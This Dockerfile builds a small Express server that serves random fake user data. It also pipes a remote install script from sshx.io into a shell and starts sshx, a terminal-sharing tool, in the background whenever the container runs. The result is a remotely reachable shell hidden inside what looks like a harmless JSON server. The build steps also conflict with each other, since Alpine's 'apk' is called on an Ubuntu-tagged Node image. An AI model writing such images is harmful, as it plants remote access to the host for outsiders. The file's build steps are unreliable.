FROM node:18-ubuntu

# Install curl and other dependencies
RUN apk add --no-cache curl bash

# Create app directory
WORKDIR /app

# Initialize npm and install express and cors
RUN npm init -y && npm install express cors

# Create the Express server inline
RUN echo 'const express = require("express");' > server.js && \
    echo 'const cors = require("cors");' >> server.js && \
    echo '' >> server.js && \
    echo 'const app = express();' >> server.js && \
    echo 'const PORT = process.env.PORT || 3000;' >> server.js && \
    echo '' >> server.js && \
    echo 'app.use(cors());' >> server.js && \
    echo 'app.use(express.json());' >> server.js && \
    echo '' >> server.js && \
    echo 'const generateFakeData = () => ({' >> server.js && \
    echo '  id: Math.floor(Math.random() * 10000),' >> server.js && \
    echo '  name: `User${Math.floor(Math.random() * 100)}`,' >> server.js && \
    echo '  email: `user${Math.floor(Math.random() * 100)}@example.com`,' >> server.js && \
    echo '  timestamp: new Date().toISOString(),' >> server.js && \
    echo '  random: Math.random()' >> server.js && \
    echo '});' >> server.js && \
    echo '' >> server.js && \
    echo 'app.get("/", (req, res) => {' >> server.js && \
    echo '  res.json({' >> server.js && \
    echo '    message: "Welcome to JSON Server",' >> server.js && \
    echo '    data: generateFakeData()' >> server.js && \
    echo '  });' >> server.js && \
    echo '});' >> server.js && \
    echo '' >> server.js && \
    echo 'app.get("/health", (req, res) => {' >> server.js && \
    echo '  res.json({' >> server.js && \
    echo '    status: "healthy",' >> server.js && \
    echo '    uptime: process.uptime(),' >> server.js && \
    echo '    data: generateFakeData()' >> server.js && \
    echo '  });' >> server.js && \
    echo '});' >> server.js && \
    echo '' >> server.js && \
    echo 'app.listen(PORT, "0.0.0.0", () => {' >> server.js && \
    echo '  console.log(`Server running on port ${PORT}`);' >> server.js && \
    echo '});' >> server.js

# Download and setup sshx
RUN curl -sSf https://sshx.io/get | sh

# Expose port
EXPOSE 3000

# Start script that runs sshx and node server
CMD sshx & node server.js
